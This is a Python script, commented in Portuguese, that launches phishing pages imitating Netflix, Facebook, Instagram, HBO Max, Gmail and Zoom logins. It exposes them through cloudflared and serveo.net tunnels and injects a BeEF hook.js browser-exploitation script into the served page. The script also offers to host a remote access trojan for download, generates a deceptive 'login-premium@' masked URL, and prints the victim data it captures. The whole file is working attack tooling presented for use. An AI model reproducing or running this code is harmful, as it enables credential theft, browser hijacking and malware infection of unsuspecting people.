#!/usr/bin/env python3
import os
import subprocess
import sys
import time
import threading
import shutil
import re
import logging
from contextlib import contextmanager
from textwrap import wrap

# Configuração de cores
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
RED = '\033[0;31m'
NC = '\033[0m'

# Configuração de logging
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__name__)

# Classe de configuração
class Config:
    APACHE_DIR = "/var/www/html/page-fake"
    MODELS_DIR = "API/img"
    BEEF_DIR = "API-BEEF/beef"
    EGS_DIR = "API/models"
    EXPLOIT_SOURCE_DIR = "exploits"
    EXPLOIT_DIR = os.path.join(APACHE_DIR, "exploits")
    
    MODELS = {
        "1": "Netflix",
        "2": "Facebook",
        "3": "Instagram",
        "4": "HBO Max",
        "5": "Gmail",
        "6": "Zoom"
    }

CONFIG = Config()
DATA_FILE = f"{CONFIG.APACHE_DIR}/dados.txt"
CONFIG_FILE = f"{CONFIG.BEEF_DIR}/config.yaml"
INDEX_FILE = f"{CONFIG.APACHE_DIR}/index.php"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def setup():
    try:
        # Cria os diretórios, se não existirem
        os.makedirs(CONFIG.APACHE_DIR, exist_ok=True)
        os.makedirs(CONFIG.EXPLOIT_DIR, exist_ok=True)
        
        # Limpa o diretório exploits antes de adicionar novos arquivos
        if os.path.exists(CONFIG.EXPLOIT_DIR):
            for filename in os.listdir(CONFIG.EXPLOIT_DIR):
                file_path = os.path.join(CONFIG.EXPLOIT_DIR, filename)
                if os.path.isfile(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    shutil.rmtree(file_path)
            logger.info(f"{YELLOW}[+] Diretório {CONFIG.EXPLOIT_DIR} limpo.{NC}")
        
        # Pergunta se quer adicionar um rat
        add_rat = input(f"{YELLOW}[+] Quer adicionar um rat? (s/n): {NC}").strip().lower()
        if add_rat == 's':
            rat_path = input(f"{YELLOW}[+] Digite o caminho do rat (exploit) para copiar para exploits: {NC}").strip()
            if os.path.exists(rat_path):
                shutil.copy(rat_path, CONFIG.EXPLOIT_DIR)
                logger.info(f"{GREEN}[+] Rat copiado de {rat_path} para {CONFIG.EXPLOIT_DIR}{NC}")
            else:
                logger.info(f"{RED}[!] Arquivo {rat_path} não encontrado! Continuando sem copiar o rat.{NC}")
        else:
            logger.info(f"{YELLOW}[+] Nenhum rat adicionado, continuando...{NC}")
        
        os.chmod(CONFIG.APACHE_DIR, 0o755)
        os.chmod(CONFIG.EXPLOIT_DIR, 0o755)
        
    except Exception as e:
        logger.error(f"{RED}[!] Erro ao configurar exploits: {str(e)}{NC}")

@contextmanager
def managed_process(*args, **kwargs):
    process = subprocess.Popen(*args, **kwargs)
    try:
        yield process
    finally:
        if process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()

def get_cloudflared_link():
    try:
        process = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:8080"],
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE,
                                 text=True)
        
        url_pattern = re.compile(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com')
        
        for _ in range(20):  # Timeout de 20 segundos
            line = process.stderr.readline()
            if line:
                match = url_pattern.search(line)
                if match:
                    real_url = match.group(0)
                    return real_url, process
            time.sleep(1)
        
        return None, process

    except Exception as e:
        logger.error(f"{RED}[!] Erro ao tentar obter link do Cloudflared: {e}{NC}")
        return None, None

def get_serveo_link():
    with managed_process(["ssh", "-R", "80:localhost:3000", "serveo.net"],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True) as process:
        url_pattern = re.compile(r'https://[a-zA-Z0-9-]+\.serveo\.net')
        for _ in range(60):
            line = process.stdout.readline()
            if line:
                match = url_pattern.search(line)
                if match:
                    serveo_url = match.group(0)
                    logger.info(f"{YELLOW}[+] Serveo.net iniciado: {serveo_url}{NC}")
                    return serveo_url, process
            time.sleep(1)
        process.terminate()
        logger.info(f"{YELLOW}[!] Falha ao iniciar Serveo.net{NC}")
        return None, None

def update_beef_config(serveo_url):
    with open(CONFIG_FILE, 'r') as f:
        config = f.read()
    
    host = serveo_url.replace("https://", "")
    config_lines = config.split('\n')
    in_public_block = False
    
    for i, line in enumerate(config_lines):
        if 'public:' in line:
            config_lines[i] = '        public:'
            in_public_block = True
        elif in_public_block and line.strip() and not line.startswith(' '):
            in_public_block = False
        
        if in_public_block:
            if 'host:' in line:
                config_lines[i] = f'            host: "{host}" # public hostname/IP address'
    
    config = '\n'.join(config_lines)
    with open(CONFIG_FILE, 'w') as f:
        f.write(config)

def update_index_php(serveo_url):
    with open(INDEX_FILE, 'r') as f:
        content = f.read()
    content = re.sub(r'http[s]?://[^\'"]+/hook\.js(?::\d+)?', f"{serveo_url}/hook.js", content)
    with open(INDEX_FILE, 'w') as f:
        f.write(content)

def cleanup_processes(processes):
    """Finaliza apenas os processos especificados, mantendo Apache ativo"""
    for proc in processes:
        if proc and hasattr(proc, 'terminate'):
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                logger.info(f"{YELLOW}[+] Processo {proc.pid} forçado a encerrar{NC}")

def start_attack(egs_type, model):
    subprocess.run(["cp", f"{CONFIG.MODELS_DIR}/{model}.jpg", f"{CONFIG.APACHE_DIR}/1.jpg"], check=True)
    
    serveo_link, serveo_proc = get_serveo_link()
    if not serveo_link:
        return None, None, None
    
    if egs_type == "1":
        subprocess.run(["cp", f"{CONFIG.EGS_DIR}/index.php", CONFIG.APACHE_DIR], check=True)
    else:
        subprocess.run(["cp", f"{CONFIG.EGS_DIR}/2.php", f"{CONFIG.APACHE_DIR}/index.php"], check=True)
    
    update_beef_config(serveo_link)
    update_index_php(serveo_link)
    
    subprocess.run(["chmod", "-R", "755", CONFIG.APACHE_DIR], check=True)
    subprocess.run(["systemctl", "start", "apache2"], check=True)

    php_proc = subprocess.Popen(["php", "-S", "localhost:8080"],
                               cwd=CONFIG.APACHE_DIR,
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)

    cf_link, cf_proc = get_cloudflared_link()
    if not cf_link:
        cleanup_processes([php_proc, serveo_proc])
        return None, None, None

    box_width = 100
    clear_screen()
    logger.info(f"{YELLOW}+{'-'*box_width}+{NC}")
    logger.info(f"{YELLOW}| {'Links Gerados'.center(box_width-2)} |{NC}")
    logger.info(f"{YELLOW}+{'-'*box_width}+{NC}")

    def format_link(label, url, max_width=box_width-4-20):
        lines = wrap(url, max_width)
        formatted = [f"{YELLOW}| {label:<20} {lines[0]:<{max_width}} |{NC}"]
        for line in lines[1:]:
            formatted.append(f"{YELLOW}| {'':<20} {line:<{max_width}}  |{NC}")
        return formatted

    for line in format_link("LINK GERADO:.........", cf_link):
        logger.info(line)
    for line in format_link("MASCARADO:...........", f"https://login-premium@{cf_link.split('://')[1]}"):
        logger.info(line)
    for line in format_link("Serveo Link Beef:....", serveo_link):
        logger.info(line)
    for line in format_link("Beef se inciado:.....", f"http://127.0.0.1"):
        logger.info(line)
    for line in format_link("Local das fotos:.....", f"/var/www/htm/page-fake/uploads"):
        logger.info(line)

    logger.info(f"{YELLOW}+{'-'*box_width}+{NC}")

    threading.Thread(target=monitor_data, args=(DATA_FILE,), daemon=True).start()
    
    return php_proc, cf_proc, serveo_proc

def monitor_data(file):
    time.sleep(2)
    while True:
        if os.path.exists(file):
            with open(file, "r") as f:
                data = f.read().strip()
                if data:
                    logger.info(f"{YELLOW}+{'-'*60}+{NC}")
                    logger.info(f"{YELLOW}| {'Dados Capturados'.center(58)} |{NC}")
                    logger.info(f"{YELLOW}+{'-'*60}+{NC}")
                    for line in data.split('\n'):
                        logger.info(f"{YELLOW} {line:<58} {NC}")
        time.sleep(20)

def show_menu(title, options):
    clear_screen()
    box_width = 100
    logger.info(f"{YELLOW}+{'-'*box_width}+{NC}")
    logger.info(f"{YELLOW}| {title.center(box_width-2)} |{NC}")
    logger.info(f"{YELLOW}+{'-'*box_width}+{NC}")
    for key, value in options.items():
        logger.info(f"{YELLOW}| {key} - {value:<{box_width-8}}   |{NC}")
    logger.info(f"{YELLOW}+{'-'*box_width}+{NC}")

def get_valid_input(prompt, valid_options):
    while True:
        choice = input(prompt).strip()
        if choice in valid_options:
            return choice
        logger.info(f"{RED}[!] Opção inválida. Escolha entre {valid_options}{NC}")

def main():
    if not shutil.which("cloudflared") or not shutil.which("php") or not shutil.which("ssh"):
        logger.info(f"{RED}[!] Dependências faltando (cloudflared, php ou ssh). Instale primeiro.{NC}")
        sys.exit(1)

    setup()

    while True:
        show_menu("MENU PRINCIPAL", 
        {
            "1": "Modo Formulario",
            "2": "Instagram seguir (em desenvolvimento)",
            "0": "Sair"
        })
        choice = get_valid_input(f"{YELLOW}[+] Escolha: {NC}", ["0", "1", "2"])
        
        if choice == "0":
            sys.exit(0)
            
        show_menu("MODELOS DISPONÍVEIS", CONFIG.MODELS)
        model = get_valid_input(f"{YELLOW}[+] Modelo: {NC}", ["0", "1", "2", "3", "4", "5", "6"])
        
        if model == "0":
            continue
            
        processes = []
        try:
            php_proc, cf_proc, serveo_proc = start_attack(choice, model)
            if not php_proc:
                logger.info(f"{RED}[!] Falha ao iniciar o ataque. Verifique as dependências e tente novamente.{NC}")
                continue
            processes = [php_proc, cf_proc, serveo_proc]
            sys.stdout.write(f"{YELLOW}\nPressione Ctrl + C para parar os serviços...{NC}\n")
            sys.stdout.flush()
            while True:  # Loop infinito até Ctrl+C ser pressionado
                time.sleep(1)  # Mantém o programa rodando
        except KeyboardInterrupt:
            logger.info(f"{YELLOW}[+] Finalizando serviços...{NC}")
            cleanup_processes([proc for proc in processes if proc is not None])
            logger.info(f"{GREEN}[+] Serviços finalizados com sucesso.{NC}")
        except Exception as e:
            logger.error(f"{RED}[!] Erro inesperado: {str(e)}{NC}")
            cleanup_processes([proc for proc in processes if proc is not None])
        finally:
            cleanup_processes([proc for proc in processes if proc is not None])

if __name__ == "__main__":
    main()
